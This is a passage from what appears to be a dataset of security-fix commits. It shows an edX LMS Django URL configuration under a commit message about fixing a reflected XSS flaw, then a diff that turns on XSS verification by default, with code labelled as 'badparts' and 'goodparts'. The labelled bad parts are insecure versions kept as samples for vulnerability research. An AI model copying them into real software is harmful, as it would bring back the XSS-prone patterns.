+=( url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/news$', 'courseware.views.news', name=\"news\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/discussion/', include('django_comment_client.urls')) ) urlpatterns +=( url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/(?P<tab_slug>[^/]+)/$', 'courseware.views.static_tab', name=\"static_tab\"), ) if settings.MITX_FEATURES.get('ENABLE_STUDENT_HISTORY_VIEW'): urlpatterns +=( url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/submission_history/(?P<student_username>[^/]*)/(?P<location>.*?)$', 'courseware.views.submission_history', name='submission_history'), ) if settings.ENABLE_JASMINE: urlpatterns +=(url(r'^_jasmine/', include('django_jasmine.urls')),) if settings.DEBUG or settings.MITX_FEATURES.get('ENABLE_DJANGO_ADMIN_SITE'): urlpatterns +=(url(r'^admin/', include(admin.site.urls)),) if settings.MITX_FEATURES.get('AUTH_USE_OPENID'): urlpatterns +=( url(r'^openid/login/$', 'django_openid_auth.views.login_begin', name='openid-login'), url(r'^openid/complete/$', 'external_auth.views.openid_login_complete', name='openid-complete'), url(r'^openid/logo.gif$', 'django_openid_auth.views.logo', name='openid-logo'), ) if settings.MITX_FEATURES.get('AUTH_USE_SHIB'): urlpatterns +=( url(r'^shib-login/$', 'external_auth.views.shib_login', name='shib-login'), ) if settings.MITX_FEATURES.get('RESTRICT_ENROLL_BY_REG_METHOD'): urlpatterns +=( url(r'^course_specific_login/(?P<course_id>[^/]+/[^/]+/[^/]+)/$', 'external_auth.views.course_specific_login', name='course-specific-login'), url(r'^course_specific_register/(?P<course_id>[^/]+/[^/]+/[^/]+)/$', 'external_auth.views.course_specific_register', name='course-specific-register'), ) if settings.MITX_FEATURES.get('AUTH_USE_OPENID_PROVIDER'): urlpatterns +=( url(r'^openid/provider/login/$', 'external_auth.views.provider_login', name='openid-provider-login'), url(r'^openid/provider/login/(?:.+)$', 'external_auth.views.provider_identity', name='openid-provider-login-identity'), url(r'^openid/provider/identity/$', 'external_auth.views.provider_identity', name='openid-provider-identity'), url(r'^openid/provider/xrds/$', 'external_auth.views.provider_xrds', name='openid-provider-xrds') ) if settings.MITX_FEATURES.get('ENABLE_PEARSON_LOGIN', False): urlpatterns +=url(r'^testcenter/login$', 'external_auth.views.test_center_login'), if settings.MITX_FEATURES.get('ENABLE_LMS_MIGRATION'): urlpatterns +=( url(r'^migrate/modules$', 'lms_migration.migrate.manage_modulestores'), url(r'^migrate/reload/(?P<reload_dir>[^/]+)$', 'lms_migration.migrate.manage_modulestores'), url(r'^migrate/reload/(?P<reload_dir>[^/]+)/(?P<commit_id>[^/]+)$', 'lms_migration.migrate.manage_modulestores'), url(r'^gitreload$', 'lms_migration.migrate.gitreload'), url(r'^gitreload/(?P<reload_dir>[^/]+)$', 'lms_migration.migrate.gitreload'), ) if settings.MITX_FEATURES.get('ENABLE_SQL_TRACKING_LOGS'): urlpatterns +=( url(r'^event_logs$', 'track.views.view_tracking_log'), url(r'^event_logs/(?P<args>.+)$', 'track.views.view_tracking_log'), ) if settings.MITX_FEATURES.get('ENABLE_SERVICE_STATUS'): urlpatterns +=( url(r'^status/', include('service_status.urls')), ) if settings.MITX_FEATURES.get('ENABLE_INSTRUCTOR_BACKGROUND_TASKS'): urlpatterns +=( url(r'^instructor_task_status/$', 'instructor_task.views.instructor_task_status', name='instructor_task_status'), ) if settings.MITX_FEATURES.get('RUN_AS_ANALYTICS_SERVER_ENABLED'): urlpatterns +=( url(r'^edinsights_service/', include('edinsights.core.urls')), ) import edinsights.core.registry urlpatterns +=( url(r'^comm/foldit_ops', 'foldit.views.foldit_ops', name=\"foldit_ops\"), ) if settings.MITX_FEATURES.get('ENABLE_DEBUG_RUN_PYTHON'): urlpatterns +=( url(r'^debug/run_python', 'debug.views.run_python'), ) if settings.MITX_FEATURES.get('ENABLE_HINTER_INSTRUCTOR_VIEW'): urlpatterns +=( url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/hint_manager$', 'instructor.hint_manager.hint_manager', name=\"hint_manager\"), ) urlpatterns=patterns(*urlpatterns) if settings.DEBUG: urlpatterns +=static(settings.STATIC_URL, document_root=settings.STATIC_ROOT) handler404='static_template_view.views.render_404' handler500='static_template_view.views.render_500' ", "sourceWithComments": "from django.conf import settings\nfrom django.conf.urls import patterns, include, url\nfrom django.contrib import admin\nfrom django.conf.urls.static import static\n\n# Not used, the work is done in the imported module.\nfrom . import one_time_startup      # pylint: disable=W0611\n\nimport django.contrib.auth.views\n\n# Uncomment the next two lines to enable the admin:\nif settings.DEBUG or settings.MITX_FEATURES.get('ENABLE_DJANGO_ADMIN_SITE'):\n    admin.autodiscover()\n\nurlpatterns = ('',  # nopep8\n    # certificate view\n\n    url(r'^update_certificate$', 'certificates.views.update_certificate'),\n    url(r'^$', 'branding.views.index', name=\"root\"),   # Main marketing page, or redirect to courseware\n    url(r'^dashboard$', 'student.views.dashboard', name=\"dashboard\"),\n    url(r'^login$', 'student.views.signin_user', name=\"signin_user\"),\n    url(r'^register$', 'student.views.register_user', name=\"register_user\"),\n\n    url(r'^admin_dashboard$', 'dashboard.views.dashboard'),\n\n    url(r'^change_email$', 'student.views.change_email_request', name=\"change_email\"),\n    url(r'^email_confirm/(?P<key>[^/]*)$', 'student.views.confirm_email_change'),\n    url(r'^change_name$', 'student.views.change_name_request', name=\"change_name\"),\n    url(r'^accept_name_change$', 'student.views.accept_name_change'),\n    url(r'^reject_name_change$', 'student.views.reject_name_change'),\n    url(r'^pending_name_changes$', 'student.views.pending_name_changes'),\n    url(r'^event$', 'track.views.user_track'),\n    url(r'^t/(?P<template>[^/]*)$', 'static_template_view.views.index'),   # TODO: Is this used anymore? What is STATIC_GRAB?\n\n    url(r'^accounts/login$', 'student.views.accounts_login', name=\"accounts_login\"),\n\n    url(r'^login_ajax$', 'student.views.login_user', name=\"login\"),\n    url(r'^login_ajax/(?P<error>[^/]*)$', 'student.views.login_user'),\n    url(r'^logout$', 'student.views.logout_user', name='logout'),\n    url(r'^create_account$', 'student.views.create_account', name='create_account'),\n    url(r'^activate/(?P<key>[^/]*)$', 'student.views.activate_account', name=\"activate\"),\n\n    url(r'^begin_exam_registration/(?P<course_id>[^/]+/[^/]+/[^/]+)$', 'student.views.begin_exam_registration', name=\"begin_exam_registration\"),\n    url(r'^create_exam_registration$', 'student.views.create_exam_registration'),\n\n    url(r'^password_reset/$', 'student.views.password_reset', name='password_reset'),\n    ## Obsolete Django views for password resets\n    ## TODO: Replace with Mako-ized views\n    url(r'^password_change/$', django.contrib.auth.views.password_change,\n        name='auth_password_change'),\n    url(r'^password_change_done/$', django.contrib.auth.views.password_change_done,\n        name='auth_password_change_done'),\n    url(r'^password_reset_confirm/(?P<uidb36>[0-9A-Za-z]+)-(?P<token>.+)/$',\n        'student.views.password_reset_confirm_wrapper',\n        name='auth_password_reset_confirm'),\n    url(r'^password_reset_complete/$', django.contrib.auth.views.password_reset_complete,\n        name='auth_password_reset_complete'),\n    url(r'^password_reset_done/$', django.contrib.auth.views.password_reset_done,\n        name='auth_password_reset_done'),\n\n    url(r'^heartbeat$', include('heartbeat.urls')),\n)\n\n# University profiles only make sense in the default edX context\nif not settings.MITX_FEATURES[\"USE_CUSTOM_THEME\"]:\n    urlpatterns += (\n        ##\n        ## Only universities without courses should be included here.  If\n        ## courses exist, the dynamic profile rule below should win.\n        ##\n        url(r'^(?i)university_profile/WellesleyX$', 'courseware.views.static_university_profile',\n            name=\"static_university_profile\", kwargs={'org_id': 'WellesleyX'}),\n        url(r'^(?i)university_profile/McGillX$', 'courseware.views.static_university_profile',\n            name=\"static_university_profile\", kwargs={'org_id': 'McGillX'}),\n        url(r'^(?i)university_profile/TorontoX$', 'courseware.views.static_university_profile',\n            name=\"static_university_profile\", kwargs={'org_id': 'TorontoX'}),\n        url(r'^(?i)university_profile/RiceX$', 'courseware.views.static_university_profile',\n            name=\"static_university_profile\", kwargs={'org_id': 'RiceX'}),\n        url(r'^(?i)university_profile/ANUx$', 'courseware.views.static_university_profile',\n            name=\"static_university_profile\", kwargs={'org_id': 'ANUx'}),\n        url(r'^(?i)university_profile/EPFLx$', 'courseware.views.static_university_profile',\n            name=\"static_university_profile\", kwargs={'org_id': 'EPFLx'}),\n\n        url(r'^university_profile/(?P<org_id>[^/]+)$', 'courseware.views.university_profile',\n            name=\"university_profile\"),\n    )\n\n#Semi-static views (these need to be rendered and have the login bar, but don't change)\nurlpatterns += (\n    url(r'^404$', 'static_template_view.views.render',\n        {'template': '404.html'}, name=\"404\"),\n)\n\n# Semi-static views only used by edX, not by themes\nif not settings.MITX_FEATURES[\"USE_CUSTOM_THEME\"]:\n    urlpatterns += (\n        url(r'^jobs$', 'static_template_view.views.render',\n            {'template': 'jobs.html'}, name=\"jobs\"),\n        url(r'^press$', 'student.views.press', name=\"press\"),\n        url(r'^media-kit$', 'static_template_view.views.render',\n            {'template': 'media-kit.html'}, name=\"media-kit\"),\n        url(r'^faq$', 'static_template_view.views.render',\n            {'template': 'faq.html'}, name=\"faq_edx\"),\n        url(r'^help$', 'static_template_view.views.render',\n            {'template': 'help.html'}, name=\"help_edx\"),\n\n        # TODO: (bridger) The copyright has been removed until it is updated for edX\n        # url(r'^copyright$', 'static_template_view.views.render',\n        #     {'template': 'copyright.html'}, name=\"copyright\"),\n\n        #Press releases\n        url(r'^press/([_a-zA-Z0-9-]+)$', 'static_template_view.views.render_press_release', name='press_release'),\n\n        # Favicon\n        (r'^favicon\\.ico$', 'django.views.generic.simple.redirect_to', {'url': '/static/images/favicon.ico'}),\n\n        url(r'^submit_feedback$', 'util.views.submit_feedback'),\n\n    )\n\n# Only enable URLs for those marketing links actually enabled in the\n# settings. Disable URLs by marking them as None.\nfor key, value in settings.MKTG_URL_LINK_MAP.items():\n    # Skip disabled URLs\n    if value is None:\n        continue\n\n    # These urls are enabled separately\n    if key == \"ROOT\" or key == \"COURSES\" or key == \"FAQ\":\n        continue\n\n    # Make the assumptions that the templates are all in the same dir\n    # and that they all match the name of the key (plus extension)\n    template = \"%s.html\" % key.lower()\n\n    # To allow theme templates to inherit from default templates,\n    # prepend a standard prefix\n    if settings.MITX_FEATURES[\"USE_CUSTOM_THEME\"]:\n        template = \"theme-\" + template\n\n    # Make the assumption that the URL we want is the lowercased\n    # version of the map key\n    urlpatterns += (url(r'^%s' % key.lower(),\n                        'static_template_view.views.render',\n                        {'template': template}, name=value),)\n\n\nif settings.PERFSTATS:\n    urlpatterns += (url(r'^reprofile$', 'perfstats.views.end_profile'),)\n\n# Multicourse wiki (Note: wiki urls must be above the courseware ones because of\n# the custom tab catch-all)\nif settings.WIKI_ENABLED:\n    from wiki.urls import get_pattern as wiki_pattern\n    from django_notify.urls import get_pattern as notify_pattern\n\n    # Note that some of these urls are repeated in course_wiki.course_nav. Make sure to update\n    # them together.\n    urlpatterns += (\n        # First we include views from course_wiki that we use to override the default views.\n        # They come first in the urlpatterns so they get resolved first\n        url('^wiki/create-root/$', 'course_wiki.views.root_create', name='root_create'),\n        url(r'^wiki/', include(wiki_pattern())),\n        url(r'^notify/', include(notify_pattern())),\n\n        # These urls are for viewing the wiki in the context of a course. They should\n        # never be returned by a reverse() so they come after the other url patterns\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/course_wiki/?$',\n            'course_wiki.views.course_wiki_redirect', name=\"course_wiki\"),\n        url(r'^courses/(?:[^/]+/[^/]+/[^/]+)/wiki/', include(wiki_pattern())),\n    )\n\n\nif settings.COURSEWARE_ENABLED:\n    urlpatterns += (\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/jump_to/(?P<location>.*)$',\n            'courseware.views.jump_to', name=\"jump_to\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/modx/(?P<location>.*?)/(?P<dispatch>[^/]*)$',\n            'courseware.module_render.modx_dispatch',\n            name='modx_dispatch'),\n\n\n        # Software Licenses\n\n        # TODO: for now, this is the endpoint of an ajax replay\n        # service that retrieve and assigns license numbers for\n        # software assigned to a course. The numbers have to be loaded\n        # into the database.\n        url(r'^software-licenses$', 'licenses.views.user_software_license', name=\"user_software_license\"),\n\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/xqueue/(?P<userid>[^/]*)/(?P<mod_id>.*?)/(?P<dispatch>[^/]*)$',\n            'courseware.module_render.xqueue_callback',\n            name='xqueue_callback'),\n        url(r'^change_setting$', 'student.views.change_setting',\n            name='change_setting'),\n\n        # TODO: These views need to be updated before they work\n        url(r'^calculate$', 'util.views.calculate'),\n        # TODO: We should probably remove the circuit package. I believe it was only used in the old way of saving wiki circuits for the wiki\n        # url(r'^edit_circuit/(?P<circuit>[^/]*)$', 'circuit.views.edit_circuit'),\n        # url(r'^save_circuit/(?P<circuit>[^/]*)$', 'circuit.views.save_circuit'),\n\n        url(r'^courses/?$', 'branding.views.courses', name=\"courses\"),\n        url(r'^change_enrollment$',\n            'student.views.change_enrollment', name=\"change_enrollment\"),\n\n        #About the course\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/about$',\n            'courseware.views.course_about', name=\"about_course\"),\n        #View for mktg site (kept for backwards compatibility TODO - remove before merge to master)\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/mktg-about$',\n            'courseware.views.mktg_course_about', name=\"mktg_about_course\"),\n        #View for mktg site\n        url(r'^mktg/(?P<course_id>.*)$',\n            'courseware.views.mktg_course_about', name=\"mktg_about_course\"),\n\n\n\n        #Inside the course\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/$',\n            'courseware.views.course_info', name=\"course_root\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/info$',\n            'courseware.views.course_info', name=\"info\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/syllabus$',\n            'courseware.views.syllabus', name=\"syllabus\"),   # TODO arjun remove when custom tabs in place, see courseware/courses.py\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>[^/]*)/$',\n            'staticbook.views.index', name=\"book\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>[^/]*)/(?P<page>[^/]*)$',\n            'staticbook.views.index'),\n\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/$',\n            'staticbook.views.pdf_index', name=\"pdf_book\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/(?P<page>[^/]*)$',\n            'staticbook.views.pdf_index', name=\"pdf_book\"),\n\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/$',\n            'staticbook.views.pdf_index', name=\"pdf_book\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/(?P<page>[^/]*)$',\n            'staticbook.views.pdf_index', name=\"pdf_book\"),\n\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>[^/]*)/$',\n            'staticbook.views.html_index', name=\"html_book\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/$',\n            'staticbook.views.html_index', name=\"html_book\"),\n\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/?$',\n            'courseware.views.index', name=\"courseware\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/(?P<chapter>[^/]*)/$',\n            'courseware.views.index', name=\"courseware_chapter\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/(?P<chapter>[^/]*)/(?P<section>[^/]*)/$',\n            'courseware.views.index', name=\"courseware_section\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/(?P<chapter>[^/]*)/(?P<section>[^/]*)/(?P<position>[^/]*)/?$',\n            'courseware.views.index', name=\"courseware_position\"),\n\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/progress$',\n            'courseware.views.progress', name=\"progress\"),\n        # Takes optional student_id for instructor use--shows profile as that student sees it.\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/progress/(?P<student_id>[^/]*)/$',\n            'courseware.views.progress', name=\"student_progress\"),\n\n        # For the instructor\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/instructor$',\n            'instructor.views.instructor_dashboard', name=\"instructor_dashboard\"),\n\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/gradebook$',\n            'instructor.views.gradebook', name='gradebook'),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/grade_summary$',\n            'instructor.views.grade_summary', name='grade_summary'),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading$',\n            'open_ended_grading.views.staff_grading', name='staff_grading'),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/get_next$',\n            'open_ended_grading.staff_grading_service.get_next', name='staff_grading_get_next'),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/save_grade$',\n            'open_ended_grading.staff_grading_service.save_grade', name='staff_grading_save_grade'),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/save_grade$',\n            'open_ended_grading.staff_grading_service.save_grade', name='staff_grading_save_grade'),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/get_problem_list$',\n            'open_ended_grading.staff_grading_service.get_problem_list', name='staff_grading_get_problem_list'),\n\n        # Open Ended problem list\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_problems$',\n            'open_ended_grading.views.student_problem_list', name='open_ended_problems'),\n\n        # Open Ended flagged problem list\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_flagged_problems$',\n            'open_ended_grading.views.flagged_problem_list', name='open_ended_flagged_problems'),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_flagged_problems/take_action_on_flags$',\n            'open_ended_grading.views.take_action_on_flags', name='open_ended_flagged_problems_take_action'),\n\n        # Cohorts management\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts$',\n            'course_groups.views.list_cohorts', name=\"cohorts\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/add$',\n            'course_groups.views.add_cohort',\n            name=\"add_cohort\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]+)$',\n            'course_groups.views.users_in_cohort',\n            name=\"list_cohort\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]+)/add$',\n            'course_groups.views.add_users_to_cohort',\n            name=\"add_to_cohort\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]+)/delete$',\n            'course_groups.views.remove_user_from_cohort',\n            name=\"remove_from_cohort\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/debug$',\n            'course_groups.views.debug_cohort_mgmt',\n            name=\"debug_cohort_mgmt\"),\n\n        # Open Ended Notifications\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_notifications$',\n            'open_ended_grading.views.combined_notifications', name='open_ended_notifications'),\n\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/peer_grading$',\n            'open_ended_grading.views.peer_grading', name='peer_grading'),\n\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/notes$', 'notes.views.notes', name='notes'),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/notes/', include('notes.urls')),\n\n    )\n\n    # allow course staff to change to student view of courseware\n    if settings.MITX_FEATURES.get('ENABLE_MASQUERADE'):\n        urlpatterns += (\n            url(r'^masquerade/(?P<marg>.*)$', 'courseware.masquerade.handle_ajax', name=\"masquerade-switch\"),\n        )\n\n    # discussion forums live within courseware, so courseware must be enabled first\n    if settings.MITX_FEATURES.get('ENABLE_DISCUSSION_SERVICE'):\n        urlpatterns += (\n            url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/news$',\n                'courseware.views.news', name=\"news\"),\n            url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/discussion/',\n                include('django_comment_client.urls'))\n        )\n    urlpatterns += (\n        # This MUST be the last view in the courseware--it's a catch-all for custom tabs.\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/(?P<tab_slug>[^/]+)/$',\n        'courseware.views.static_tab', name=\"static_tab\"),\n    )\n\n    if settings.MITX_FEATURES.get('ENABLE_STUDENT_HISTORY_VIEW'):\n        urlpatterns += (\n            url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/submission_history/(?P<student_username>[^/]*)/(?P<location>.*?)$',\n                'courseware.views.submission_history',\n                name='submission_history'),\n        )\n\n\nif settings.ENABLE_JASMINE:\n    urlpatterns += (url(r'^_jasmine/', include('django_jasmine.urls')),)\n\nif settings.DEBUG or settings.MITX_FEATURES.get('ENABLE_DJANGO_ADMIN_SITE'):\n    ## Jasmine and admin\n    urlpatterns += (url(r'^admin/', include(admin.site.urls)),)\n\nif settings.MITX_FEATURES.get('AUTH_USE_OPENID'):\n    urlpatterns += (\n        url(r'^openid/login/$', 'django_openid_auth.views.login_begin', name='openid-login'),\n        url(r'^openid/complete/$', 'external_auth.views.openid_login_complete', name='openid-complete'),\n        url(r'^openid/logo.gif$', 'django_openid_auth.views.logo', name='openid-logo'),\n    )\n\nif settings.MITX_FEATURES.get('AUTH_USE_SHIB'):\n    urlpatterns += (\n        url(r'^shib-login/$', 'external_auth.views.shib_login', name='shib-login'),\n    )\n\nif settings.MITX_FEATURES.get('RESTRICT_ENROLL_BY_REG_METHOD'):\n    urlpatterns += (\n        url(r'^course_specific_login/(?P<course_id>[^/]+/[^/]+/[^/]+)/$',\n            'external_auth.views.course_specific_login', name='course-specific-login'),\n        url(r'^course_specific_register/(?P<course_id>[^/]+/[^/]+/[^/]+)/$',\n            'external_auth.views.course_specific_register', name='course-specific-register'),\n\n    )\n\n\nif settings.MITX_FEATURES.get('AUTH_USE_OPENID_PROVIDER'):\n    urlpatterns += (\n        url(r'^openid/provider/login/$', 'external_auth.views.provider_login', name='openid-provider-login'),\n        url(r'^openid/provider/login/(?:.+)$', 'external_auth.views.provider_identity', name='openid-provider-login-identity'),\n        url(r'^openid/provider/identity/$', 'external_auth.views.provider_identity', name='openid-provider-identity'),\n        url(r'^openid/provider/xrds/$', 'external_auth.views.provider_xrds', name='openid-provider-xrds')\n    )\n\nif settings.MITX_FEATURES.get('ENABLE_PEARSON_LOGIN', False):\n    urlpatterns += url(r'^testcenter/login$', 'external_auth.views.test_center_login'),\n\nif settings.MITX_FEATURES.get('ENABLE_LMS_MIGRATION'):\n    urlpatterns += (\n        url(r'^migrate/modules$', 'lms_migration.migrate.manage_modulestores'),\n        url(r'^migrate/reload/(?P<reload_dir>[^/]+)$', 'lms_migration.migrate.manage_modulestores'),\n        url(r'^migrate/reload/(?P<reload_dir>[^/]+)/(?P<commit_id>[^/]+)$', 'lms_migration.migrate.manage_modulestores'),\n        url(r'^gitreload$', 'lms_migration.migrate.gitreload'),\n        url(r'^gitreload/(?P<reload_dir>[^/]+)$', 'lms_migration.migrate.gitreload'),\n    )\n\nif settings.MITX_FEATURES.get('ENABLE_SQL_TRACKING_LOGS'):\n    urlpatterns += (\n        url(r'^event_logs$', 'track.views.view_tracking_log'),\n        url(r'^event_logs/(?P<args>.+)$', 'track.views.view_tracking_log'),\n    )\n\nif settings.MITX_FEATURES.get('ENABLE_SERVICE_STATUS'):\n    urlpatterns += (\n        url(r'^status/', include('service_status.urls')),\n    )\n\nif settings.MITX_FEATURES.get('ENABLE_INSTRUCTOR_BACKGROUND_TASKS'):\n    urlpatterns += (\n        url(r'^instructor_task_status/$', 'instructor_task.views.instructor_task_status', name='instructor_task_status'),\n    )\n\nif settings.MITX_FEATURES.get('RUN_AS_ANALYTICS_SERVER_ENABLED'):\n    urlpatterns += (\n        url(r'^edinsights_service/', include('edinsights.core.urls')),\n    )\n    import edinsights.core.registry\n\n# FoldIt views\nurlpatterns += (\n    # The path is hardcoded into their app...\n    url(r'^comm/foldit_ops', 'foldit.views.foldit_ops', name=\"foldit_ops\"),\n)\n\nif settings.MITX_FEATURES.get('ENABLE_DEBUG_RUN_PYTHON'):\n    urlpatterns += (\n        url(r'^debug/run_python', 'debug.views.run_python'),\n    )\n\n# Crowdsourced hinting instructor manager.\nif settings.MITX_FEATURES.get('ENABLE_HINTER_INSTRUCTOR_VIEW'):\n    urlpatterns += (\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/hint_manager$',\n            'instructor.hint_manager.hint_manager', name=\"hint_manager\"),\n    )\n\nurlpatterns = patterns(*urlpatterns)\n\nif settings.DEBUG:\n    urlpatterns += static(settings.STATIC_URL, document_root=settings.STATIC_ROOT)\n\n#Custom error pages\nhandler404 = 'static_template_view.views.render_404'\nhandler500 = 'static_template_view.views.render_500'\n"}}, "msg": "Fix LMS-530, reflected XSS\n\nLimit the page and chapter numbers to digits, to keep malicious URL\ncomponents from being inserted onto the page."}, "1162dbc18fda91b07a5942873387d60fd67b2cfc": {"url": "https://api.github.com/repos/ExtensionEngine/ed2go-edx-platform/commits/1162dbc18fda91b07a5942873387d60fd67b2cfc", "html_url": "https://github.com/ExtensionEngine/ed2go-edx-platform/commit/1162dbc18fda91b07a5942873387d60fd67b2cfc", "sha": "1162dbc18fda91b07a5942873387d60fd67b2cfc", "keyword": "XSS check", "diff": "diff --git a/pavelib/paver_tests/test_paver_bok_choy_cmds.py b/pavelib/paver_tests/test_paver_bok_choy_cmds.py\nindex 0573565146..9f37700463 100644\n--- a/pavelib/paver_tests/test_paver_bok_choy_cmds.py\n+++ b/pavelib/paver_tests/test_paver_bok_choy_cmds.py\n@@ -18,7 +18,7 @@ class TestPaverBokChoyCmd(unittest.TestCase):\n     Paver Bok Choy Command test cases\n     \"\"\"\n \n-    def _expected_command(self, name, store=None, verify_xss=False):\n+    def _expected_command(self, name, store=None, verify_xss=True):\n         \"\"\"\n         Returns the command that is expected to be run for the given test spec\n         and store.\n@@ -101,11 +101,11 @@ def test_verify_xss(self):\n         self.assertEqual(suite.cmd, self._expected_command(name=name, verify_xss=True))\n \n     def test_verify_xss_env_var(self):\n-        self.env_var_override.set('VERIFY_XSS', 'True')\n+        self.env_var_override.set('VERIFY_XSS', 'False')\n         with self.env_var_override:\n             suite = BokChoyTestSuite('')\n             name = 'tests'\n-            self.assertEqual(suite.cmd, self._expected_command(name=name, verify_xss=True))\n+            self.assertEqual(suite.cmd, self._expected_command(name=name, verify_xss=False))\n \n     def test_test_dir(self):\n         test_dir = 'foo'\ndiff --git a/pavelib/utils/test/suites/bokchoy_suite.py b/pavelib/utils/test/suites/bokchoy_suite.py\nindex 19d51da7b5..327b6b9c3c 100644\n--- a/pavelib/utils/test/suites/bokchoy_suite.py\n+++ b/pavelib/utils/test/suites/bokchoy_suite.py\n@@ -58,7 +58,7 @@ def __init__(self, *args, **kwargs):\n         self.default_store = kwargs.get('default_store', None)\n         self.verbosity = kwargs.get('verbosity', DEFAULT_VERBOSITY)\n         self.num_processes = kwargs.get('num_processes', DEFAULT_NUM_PROCESSES)\n-        self.verify_xss = kwargs.get('verify_xss', os.environ.get('VERIFY_XSS', False))\n+        self.verify_xss = kwargs.get('verify_xss', os.environ.get('VERIFY_XSS', True))\n         self.extra_args = kwargs.get('extra_args', '')\n         self.har_dir = self.log_dir / 'hars'\n         self.a11y_file = Env.BOK_CHOY_A11Y_CUSTOM_RULES_FILE\n", "message": "", "files": {"/pavelib/paver_tests/test_paver_bok_choy_cmds.py": {"changes": [{"diff": "\n     Paver Bok Choy Command test cases\n     \"\"\"\n \n-    def _expected_command(self, name, store=None, verify_xss=False):\n+    def _expected_command(self, name, store=None, verify_xss=True):\n         \"\"\"\n         Returns the command that is expected to be run for the given test spec\n         and store.\n", "add": 1, "remove": 1, "filename": "/pavelib/paver_tests/test_paver_bok_choy_cmds.py", "badparts": ["    def _expected_command(self, name, store=None, verify_xss=False):"], "goodparts": ["    def _expected_command(self, name, store=None, verify_xss=True):"]}, {"diff": "\n         self.assertEqual(suite.cmd, self._expected_command(name=name, verify_xss=True))\n \n     def test_verify_xss_env_var(self):\n-        self.env_var_override.set('VERIFY_XSS', 'True')\n+        self.env_var_override.set('VERIFY_XSS', 'False')\n         with self.env_var_override:\n             suite = BokChoyTestSuite('')\n             name = 'tests'\n-            self.assertEqual(suite.cmd, self._expected_command(name=name, verify_xss=True))\n+            self.assertEqual(suite.cmd, self._expected_command(name=name, verify_xss=False))\n \n     def test_test_dir(self):\n         test_dir = 'foo'", "add": 2, "remove": 2, "filename": "/pavelib/paver_tests/test_paver_bok_choy_cmds.py", "badparts": ["        self.env_var_override.set('VERIFY_XSS', 'True')", "            self.assertEqual(suite.cmd, self._expected_command(name=name, verify_xss=True))"], "goodparts": ["        self.env_var_override.set('VERIFY_XSS', 'False')", "            self.assertEqual(suite.cmd, 